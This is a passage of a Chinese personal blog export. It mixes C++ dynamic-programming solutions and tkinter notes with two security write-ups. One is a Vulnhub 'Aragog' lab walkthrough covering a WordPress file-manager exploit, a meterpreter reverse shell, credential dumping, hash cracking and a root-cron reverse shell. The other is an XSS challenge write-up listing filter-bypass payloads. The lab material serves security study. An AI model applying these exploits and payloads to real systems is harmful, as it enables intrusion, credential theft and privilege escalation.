class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t\tb[i][j] = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(c[i<span class=\"number\">-1</span>][j]&gt;c[i][j<span class=\"number\">-1</span>])&#123;</span><br><span class=\"line\">\t\t\t\tc[i][j] = c[i<span class=\"number\">-1</span>][j];</span><br><span class=\"line\">\t\t\t\tb[i][j] = <span class=\"number\">2</span>;\t\t\t\t</span><br><span class=\"line\">\t\t\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t\t\tc[i][j] = c[i][j<span class=\"number\">-1</span>];</span><br><span class=\"line\">\t\t\t\tb[i][j] = <span class=\"number\">3</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//寻找最优解</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">traceback</span><span class=\"params\">(<span class=\"keyword\">int</span> i,<span class=\"keyword\">int</span> j)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(i==<span class=\"number\">-1</span>||j==<span class=\"number\">-1</span>) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(b[i][j]==<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span>&lt;&lt;x[i];</span><br><span class=\"line\">\t\ttraceback(i<span class=\"number\">-1</span>,j<span class=\"number\">-1</span>);\t</span><br><span class=\"line\">\t&#125; </span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(b[i][j]==<span class=\"number\">2</span>) traceback(i<span class=\"number\">-1</span>,j);</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> traceback(i,j<span class=\"number\">-1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(<span class=\"built_in\">cin</span>&gt;&gt;x&gt;&gt;y)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> a = x.length();</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> b = y.length();</span><br><span class=\"line\">\t\tLCSLength(a,b);</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span>&lt;&lt;c[a<span class=\"number\">-1</span>][b<span class=\"number\">-1</span>]&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\ttraceback(a<span class=\"number\">-1</span>, b<span class=\"number\">-1</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"最大字段和\"><a href=\"#最大字段和\" class=\"headerlink\" title=\"最大字段和\"></a>最大字段和</h2><blockquote>\n<p>题目描述<br>给定n个整数组成的序列a1,a2,…an, 求子段和ai+ai+1+…+aj（子段可为空集）的最大值。</p>\n<p>输入<br>包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=20)，代表测试数据个数。<br>每组测试数据第一行为一个整数n，代表有n个整数(1&lt;=n&lt;=10000)。<br>接下来一行有n个数x(-1000&lt;=x&lt;=1000)。</p>\n<p>输出<br>输出其对应的最大子段和。</p>\n</blockquote>\n<p>递推公式</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">b[i] &#x3D; max&#123;b[i-1]+a[i], a[i]&#125;  (1≤i≤n)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">int</span> num[<span class=\"number\">10005</span>];</span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"><span class=\"comment\">//再给出输出最优解的方法</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> temp_start,len;</span><br><span class=\"line\"><span class=\"keyword\">int</span> besti,bestj;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">get_res</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=besti;i&lt;bestj;i++)&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span>&lt;&lt;num[i]&lt;&lt;<span class=\"string\">\" \"</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> t,n;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> b = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> ans =<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cin</span>&gt;&gt;t;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(t&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cin</span>&gt;&gt;n;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;n;i++)&#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">cin</span>&gt;&gt;num[i];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\ttemp_start = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\tlen = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;n;i++)&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(b&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">\t\t\t\tb = b + num[i];</span><br><span class=\"line\">\t\t\t\tlen++;</span><br><span class=\"line\">\t\t\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t\t\tb = num[i];</span><br><span class=\"line\">\t\t\t\ttemp_start = i;</span><br><span class=\"line\">\t\t\t\tlen = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(ans &lt; b)&#123;</span><br><span class=\"line\">\t\t\t\tans = b;</span><br><span class=\"line\">\t\t\t\tbesti = temp_start;</span><br><span class=\"line\">\t\t\t\tbestj = temp_start + len;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span>&lt;&lt;ans&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t<span class=\"comment\">//get_res();</span></span><br><span class=\"line\">\t\tt--;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"矩阵连乘\"><a href=\"#矩阵连乘\" class=\"headerlink\" title=\"矩阵连乘\"></a>矩阵连乘</h2><p>待续</p>\n<h2 id=\"0-1背包\"><a href=\"#0-1背包\" class=\"headerlink\" title=\"0-1背包\"></a>0-1背包</h2><blockquote>\n<p>题目描述<br>已知有N种物品和一个可容纳C重量的背包。每种物品i的重量为Wi，价值为Pi。那么，采用怎样的装包方法才会使装入背包物品的总价值最大。</p>\n<p>输入<br>包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=10)，代表测试数据个数。</p>\n<p>接下来有T组测试数据。每组测试数据第一行为背包的重量C(C&lt;10000)和物品个数N(N&lt;1000)。接下来的N行分别为物品的重量cost(1&lt;=cost&lt;=100)和价值val(1&lt;=val&lt;=3000000)。（注意：结果可能超过int范围）</p>\n<p>输出<br>对每组测试数据，输出其对应的所装物品的最大价值。</p>\n</blockquote>\n<p><img src=\"/2019/01/01/suanfa/2.png\" alt=\"递推公式\"></p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> c,n;</span><br><span class=\"line\"><span class=\"keyword\">int</span> x[<span class=\"number\">1005</span>];</span><br><span class=\"line\"><span class=\"keyword\">long</span> w[<span class=\"number\">1005</span>];</span><br><span class=\"line\"><span class=\"keyword\">long</span> v[<span class=\"number\">1005</span>];</span><br><span class=\"line\"><span class=\"keyword\">long</span> <span class=\"keyword\">long</span> m[<span class=\"number\">1005</span>][<span class=\"number\">10005</span>];<span class=\"comment\">//数组长度要开的合适一点</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">pack</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;w[n];i++) m[n][i] = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=w[n];i&lt;=c;i++) m[n][i] = v[n];</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=n<span class=\"number\">-1</span>;i&gt;<span class=\"number\">0</span>;i--)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j=<span class=\"number\">0</span>;j&lt;w[i];j++) m[i][j] = m[i+<span class=\"number\">1</span>][j];</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j=w[i];j&lt;=c;j++)&#123;</span><br><span class=\"line\">\t\t\tm[i][j] = max(m[i+<span class=\"number\">1</span>][j],m[i+<span class=\"number\">1</span>][j-w[i]]+v[i]);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//利用m的下标的意义来构造最优解 </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">traceback</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>;i&lt;=n;i++)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(m[i][c]!=m[i+<span class=\"number\">1</span>][c])&#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">cout</span>&lt;&lt;i&lt;&lt;<span class=\"string\">\" \"</span>;</span><br><span class=\"line\">\t\t\tc -= w[i];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125; </span><br><span class=\"line\">\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> t;</span><br><span class=\"line\">\t<span class=\"built_in\">cin</span>&gt;&gt;t;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(t--)&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cin</span>&gt;&gt;c&gt;&gt;n;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>;i&lt;=n;i++) <span class=\"built_in\">cin</span>&gt;&gt;w[i]&gt;&gt;v[i]; </span><br><span class=\"line\">\t\tpack();</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span>&lt;&lt;m[<span class=\"number\">1</span>][c]&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t<span class=\"comment\">//traceback();</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","categories":["Record"],"tags":["Algorithm"]},{"title":"tkinter","url":"/2017/12/20/tkinter/","content":"<p>最近程序设计课我不知道为什么鬼使神差的使用python的tkinter库开发了gui程序，虽然过程很多波折，但是还是学到了不少东西的，特地把一些东西记录一下。<br><a id=\"more\"></a></p>\n<p><strong>简单开始</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">from tkinter import *</span><br><span class=\"line\">root &#x3D; Tk()</span><br><span class=\"line\">root.title(&quot;start&quot;)</span><br><span class=\"line\">root.mainloop()</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"http://effbot.org/tkinterbook/\" target=\"_blank\" rel=\"noopener\">参考文档</a></p>\n<hr>\n<p>该模块中对于控件的放置支持三种方法<br> pack方法</p>\n<blockquote>\n<p>pack的放置是基于块的思想来实现的，每一个块放置后系统会自动填充到目标窗体中，可以通过属性来改变其放置的位置，属于tkinter中比较常用的一种方法。注意frame控件属于pack()方法的内容，不能够和其它方法混用。</p>\n</blockquote>\n<p>常用参数：</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">参数</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">anchor</td>\n<td>设置对齐方式，以地理坐标的方式，参数有E,W,N,S(东南西北),EN,ES,WE,WS,W+E+S+N</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">fill</td>\n<td>填充方向，可以选择X方向，Y方向，BOTH指两个方向都包含</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">expand</td>\n<td>设置是否扩充</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">ipadx</td>\n<td>x内边距</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">ipady</td>\n<td>y内边距</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">padx</td>\n<td>x外边距</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">pady</td>\n<td>y外边距</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">side</td>\n<td>放置大致方位</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p>grid方法</p>\n<blockquote>\n<p>grid方法对于控件的放置是基于表格的形式来放置，但是通过row，column选项可以控制控件的位置，注意row或者column选项值相等的控件会水平或竖直对齐。</p>\n</blockquote>\n<p>place方法</p>\n<blockquote>\n<p>该方法通过指定在屏幕上的x，y值来控制控件的位置，可以实现非常精确的控制，但是这种方法编写非常复杂，所以不推荐这种方法。</p>\n</blockquote>\n<p>注意：这三种方法不能再一个窗口中混用，尤其是pack和grid方法，如果混用会报错。而且会导致控件放置错乱。</p>\n<hr>\n<p>对于treeview视图，贴个网址，我感觉就应该足够了<br><a href=\"https://www.jianshu.com/p/6a37d33e96a2\" target=\"_blank\" rel=\"noopener\">点我</a></p>\n<h2 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h2><p>本来一片雄心想大写特写，然而，理想很丰满，现实很骨感，还是没写多少东西，不过感觉也差不多够用了(#^.^#)。</p>\n","categories":["资料"],"tags":["tkinter"]},{"title":"Vulnhub系列-Aragog","url":"/2021/05/30/vulnhubAragog/","content":"<p><img src=\"/2021/05/30/vulnhubAragog/2.jpg\" alt></p>\n<a id=\"more\"></a>\n<h1 id=\"Aragog\"><a href=\"#Aragog\" class=\"headerlink\" title=\"Aragog\"></a>Aragog</h1><p>经过扫描IP地址为192.168.56.107</p>\n<p>然后进行端口扫描</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">nmap -p- -sT -vv -O 192.168.56.107</span><br></pre></td></tr></table></figure>\n<p>还是开放了80和22端口，那么对80端口进行测试</p>\n<p>下一步进行目录爆破</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 /opt/dirsearch/dirsearch.py -u http://192.168.56.107/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -e php,txt,html -f -t 40</span><br></pre></td></tr></table></figure>\n<p>进行爆破之后发现blog目录下存在wordpress博客，在kali下有一个wordpress工具wpscan，使用该工具进行扫描</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">wpscan --url http://192.168.56.107/blog/ -t 20 --plugins-detection aggressive</span><br></pre></td></tr></table></figure>\n<p>扫描之后发现存在一个插件</p>\n<p><img src=\"/2021/05/30/vulnhubAragog/2.png\" alt></p>\n<p>版本号为6.0，该插件存在CVE-2020-25213，github上有exp，利用该漏洞可以上传木马到后台getshell</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">./wp-file-manager-exploit.sh -u http://192.168.56.107/blog -f /tmp/shell.php</span><br></pre></td></tr></table></figure>\n<p>这里-f参数需要使用绝对目录，否则会上传失败</p>\n<p>之后会返回URL，使用蚁剑连接该URL即可getshell</p>\n<p>查看/home/hagrid98可以得到第一段flag</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">cat /home/hagrid98/horcrux1.txt</span><br><span class=\"line\">horcrux_&#123;MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==&#125;</span><br></pre></td></tr></table></figure>\n<p>使用msf生成木马</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\"><span class=\"built_in\">set</span> payload php/meterpreter/reverse_tcp</span><br><span class=\"line\"><span class=\"built_in\">set</span> LHOST 192.168.56.108</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<p>然后我们生成木马上传到目标系统</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.56.108 LPORT=4444 -f raw &gt; msf.php</span><br></pre></td></tr></table></figure>\n<p>然后kali在kali上执行shell命令即可获得交互式shell</p>\n<p>查看进程发现有mysql进行，在wordpress配置文件中有mysql的用户名和密码</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">cat /etc/wordpress/config-default.php</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">define(<span class=\"string\">'DB_NAME'</span>, <span class=\"string\">'wordpress'</span>);</span><br><span class=\"line\">define(<span class=\"string\">'DB_USER'</span>, <span class=\"string\">'root'</span>);</span><br><span class=\"line\">define(<span class=\"string\">'DB_PASSWORD'</span>, <span class=\"string\">'mySecr3tPass'</span>);</span><br><span class=\"line\">define(<span class=\"string\">'DB_HOST'</span>, <span class=\"string\">'localhost'</span>);</span><br><span class=\"line\">define(<span class=\"string\">'DB_COLLATE'</span>, <span class=\"string\">'utf8_general_ci'</span>);</span><br><span class=\"line\">define(<span class=\"string\">'WP_CONTENT_DIR'</span>, <span class=\"string\">'/usr/share/wordpress/wp-content'</span>);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>连接mysql，查看是否有密码信息</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">mysql -uroot -pmySecr3tPass -Dwordpress</span><br><span class=\"line\">select * from wp_users;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/05/30/vulnhubAragog/3.png\" alt></p>\n<p>在kali下使用hachcat时会报错，所以在windows下破解</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">./hashcat.exe -O -m 400 -a 0 -o cracked.txt .\\hash.txt C:\\Users\\aesm1p\\Desktop\\rockyou.txt</span><br></pre></td></tr></table></figure>\n<p>很快就爆破出来了结果为</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$P</span><span class=\"variable\">$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc</span>.:password123</span><br></pre></td></tr></table></figure>\n<p>使用账户名密码进行ssh登录，得到第一段flag</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">hagrid98@Aragog:~$ cat horcrux1.txt</span><br><span class=\"line\">horcrux_&#123;MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==&#125;</span><br></pre></td></tr></table></figure>\n<p>在寻找信息之后没有找到合适的信息，有一款工具pspy可以用来监测系统中运行的不需要root权限的进程</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">2021/05/29 11:04:01 CMD: UID=0 PID=7682 | /bin/sh -c bash -c <span class=\"string\">\"/opt/.backup.sh\"</span></span><br></pre></td></tr></table></figure>\n<p>这个进程uid为0，每两分钟运行一次，而且这个文件任意用户均可读写，所以我们在这个文件中写入木马：</p>\n<p>kali中存在webshells，我们将该webshell补全参数后上传，然后监听等待反弹shell</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">nc -lvvp 4444</span><br></pre></td></tr></table></figure>\n<p>编辑靶机上的.backup.sh文件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\">cp -r /usr/share/wordpress/wp-content/uploads/ /tmp/tmp_wp_uploads</span><br><span class=\"line\">php /tmp/php-reverse-shell.php</span><br></pre></td></tr></table></figure>\n<p>然后最多等待两分钟即可在kali上收到反弹的shell</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(kali㉿kali)-[~/Desktop]</span><br><span class=\"line\">└─$ nc -lvvp 4444</span><br><span class=\"line\">listening on [any] 4444 ...</span><br><span class=\"line\">192.168.56.107: inverse host lookup failed: Host name lookup failure</span><br><span class=\"line\">connect to [192.168.56.108] from (UNKNOWN) [192.168.56.107] 48774</span><br><span class=\"line\">Linux Aragog 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux</span><br><span class=\"line\"> 11:26:01 up 17:51,  1 user,  load average: 0.00, 0.02, 0.00</span><br><span class=\"line\">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class=\"line\">hagrid98 pts/0    192.168.56.108   09:39   17.00s  0.15s  0.15s -bash</span><br><span class=\"line\">uid=0(root) gid=0(root) groups=0(root)</span><br><span class=\"line\">/bin/sh: 0: can't access tty; job control turned off</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> id</span></span><br><span class=\"line\">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>","categories":["vulnhub"],"tags":["wordpress"]},{"title":"XSS20冲关之旅","url":"/2019/03/02/xss20/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>最近学到了xss漏洞，来做一下这个xss题目</p>\n<a id=\"more\"></a>\n<h1 id=\"XSS-1\"><a href=\"#XSS-1\" class=\"headerlink\" title=\"XSS-1\"></a>XSS-1</h1><p>第一关热身，没有任何过滤。payload：<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p>\n<h1 id=\"XSS-2\"><a href=\"#XSS-2\" class=\"headerlink\" title=\"XSS-2\"></a>XSS-2</h1><p>查看代码可知<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$str = $_GET[<span class=\"string\">\"keyword\"</span>];</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;h2 align=center&gt;没有找到和\"</span>.htmlspecialchars($str).<span class=\"string\">\"相关的结果.&lt;/h2&gt;\"</span>.<span class=\"string\">'&lt;center&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;form action=level2.php method=GET&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input name=keyword  value=\"'</span>.$str.<span class=\"string\">'\"&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>对于输入的内容，题目使用了htmlspecialchars来转义特殊字符，此处不好绕过，但是题目在input标签中却没有验证参数而直接输入，此时我们可以构造payload闭合input标签</p>\n<p>payload: <code>keyword=&quot;&gt;  &lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，此时在代码中input标签的内容就变成<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;input name&#x3D;keyword value&#x3D;&quot;&quot;&gt;  &lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;&gt;</span><br></pre></td></tr></table></figure></p>\n<p>成功成为了两个标签从而xss成功</p>\n<h1 id=\"XSS-3\"><a href=\"#XSS-3\" class=\"headerlink\" title=\"XSS-3\"></a>XSS-3</h1><p>这此input标签也被转义了，所以只能正面绕过htmlspecialchar()函数了，百度可以发现该函数默认是不转义单引号的，只有设置了quotestyle 选项为ENT_QUOTES才会过滤单引号，而本题又是单引号闭合的所以用单引号即可绕过</p>\n<p>payload: <code>http://localhost/xss20/level3.php?keyword=&#39; onclick=&#39;window.alert()&#39;</code></p>\n<p><img src=\"/2019/03/02/xss20/1.png\" alt></p>\n<h1 id=\"XSS-4\"><a href=\"#XSS-4\" class=\"headerlink\" title=\"XSS-4\"></a>XSS-4</h1><p>我们可以先fuzz一下，输入<code>&lt;script&gt;&#39;&quot;</code>，然后查看源代码可知</p>\n<p><img src=\"/2019/03/02/xss20/2.png\" alt></p>\n<p>可以看到题目将左右尖括号置换为空，但是单双引号都还可以用，本题是用双引号闭合的，所以只需要把第三关的稍微改一下即可</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level4.php?keyword&#x3D;&quot; onclick&#x3D;&quot;window.alert()&quot;</span><br></pre></td></tr></table></figure>\n<h1 id=\"XSS-5\"><a href=\"#XSS-5\" class=\"headerlink\" title=\"XSS-5\"></a>XSS-5</h1><p>想上一关测试一下<code>&lt;script&gt;&#39;&quot;</code>，发现scirpt被转成了scr_ipt，我们可以尝试上关的payload闭合双引号，但是发现onclick被置换成了o_nclick，换个思路，第二题中由于题目没有过滤<code>&lt;&gt;</code>，我们可以另行构造一个标签，在本题中也没有单独过滤这两个符号，所以可以用类似第二关的方式绕过<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level5.php?keyword&#x3D;&quot;&gt;&lt;a href&#x3D;javascript:alert(19)&gt;</span><br></pre></td></tr></table></figure></p>\n<p>查看源代码可知题目采用黑名单过滤了<code>&lt;script</code>和<code>on</code>两个敏感词</p>\n<h1 id=\"XSS-6\"><a href=\"#XSS-6\" class=\"headerlink\" title=\"XSS-6\"></a>XSS-6</h1><p>测试<code>&lt;script&gt;&#39;&quot;on</code>，发现还是基本和上关的过滤一样，<code>&lt;input name=keyword  value=&quot;&lt;scr_ipt&gt;&#39;&quot;o_n&quot;&gt;</code>，用上题payload故技重施，发现并没有那么简单，<code>href</code>被置换成了<code>hr_ef</code>，继续测试<code>data,action,formaction</code>，继续测试可以发现很多都被过滤了，走投无路之下大小写绕过试了一下居然就过了，可我记得上道题是大小写不敏感的呀…<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level6.php?keyword&#x3D;&quot;&gt;&lt;a Href&#x3D;javascript:alert(19)&gt;</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"XSS-7\"><a href=\"#XSS-7\" class=\"headerlink\" title=\"XSS-7\"></a>XSS-7</h1><p>继续测试<code>&lt;script&gt;&#39;&quot;on</code>-&gt;<code>&lt;&gt;&#39;&quot;on</code>，猜测可能是将script置换为空字符，尝试双写绕过<code>&lt;scscriptript&gt;</code>，成功！对于其他敏感词如<code>on</code>等也可以用双写绕过，之前都是将敏感字符加下划线，本题是转化为空字符串<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level7.php?keyword&#x3D;&quot; oonnclick&#x3D;&quot;window.alert()</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"XSS-8\"><a href=\"#XSS-8\" class=\"headerlink\" title=\"XSS-8\"></a>XSS-8</h1><p>测试<code>script&gt;&lt;&#39;&quot;</code></p>\n<p><img src=\"/2019/03/02/xss20/7.png\" 